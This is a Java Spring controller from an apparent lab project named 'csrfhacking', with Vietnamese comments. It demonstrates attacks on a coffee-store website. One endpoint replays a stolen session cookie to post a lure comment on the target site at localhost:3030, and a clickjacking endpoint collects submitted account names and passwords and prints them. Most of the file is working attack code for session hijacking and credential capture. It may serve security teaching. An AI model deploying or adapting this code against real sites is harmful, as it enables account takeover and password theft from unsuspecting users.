package com.example.csrfhacking;

import com.example.csrfhacking.config.XFrameOptionsInterceptor;
import org.springframework.http.*;
import org.springframework.stereotype.Controller;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.client.RestTemplate;
import org.springframework.web.servlet.view.RedirectView;
import org.springframework.web.util.UriComponentsBuilder;
import org.springframework.web.util.UriUtils;

import java.net.URI;
import java.nio.charset.StandardCharsets;

@Controller
@RequestMapping("/home")
public class loginController {

    @GetMapping("/login")
    public String getSessionId(){
        return "redirect:https://filtrocoffeestore-production.up.railway.app/";
    }

    @GetMapping("/index")
    public String loadIndex(){
        return "login";
    }

    @GetMapping("/capheFiltro")
    public RedirectView comment(){
        RestTemplate restTemplate = new RestTemplate();

        String url = "http://localhost:3030/product/9/feedback";
        String content = "Hãy xem những quán bánh ngon tại đây http://localhost:4040/home/nhungquanbanhngon";

        // Mã hóa giá trị content
        String encodedContent = UriUtils.encode(content, StandardCharsets.UTF_8);

        // Tạo HttpHeaders và đặt thông tin session
        HttpHeaders headers = new HttpHeaders();
        headers.add(HttpHeaders.COOKIE, XFrameOptionsInterceptor.sessionId); // Thay your_session_id bằng giá trị session thực tế

        // Tạo HttpEntity với headers
        HttpEntity<?> requestEntity = new HttpEntity<>(headers);

        // Đặt các giá trị vào request param
        UriComponentsBuilder uriBuilder = UriComponentsBuilder.fromUriString(url)
                .queryParam("content", content);

        //Chuyển sang url của trang web bị tấn công
        restTemplate.postForObject(uriBuilder.toUriString(), requestEntity, Void.class);
        String redirectUrl = "http://localhost:3030/product/9";
        return new RedirectView(redirectUrl);
    }

    @GetMapping("/nhungquanbanhngon2")
    public String comment2(){return "comment2"; }

    @GetMapping("/capheFiltroClick")
    public String clickjacking(){return "login"; }

    @PostMapping("/xuLyClickJacking")
    public ResponseEntity<String> xuLyLoginClickJacking(@RequestParam String accountName, String password){
        System.out.println("AccountName = " + accountName);
        System.out.println("Password = " + password);
        String message = "login thanh cong!";
        return new ResponseEntity<>(message, HttpStatus.OK);
    }

    @GetMapping("/nhungquancaphengon2")
    public String clickjacking2(){return "clickJacking2"; }
}
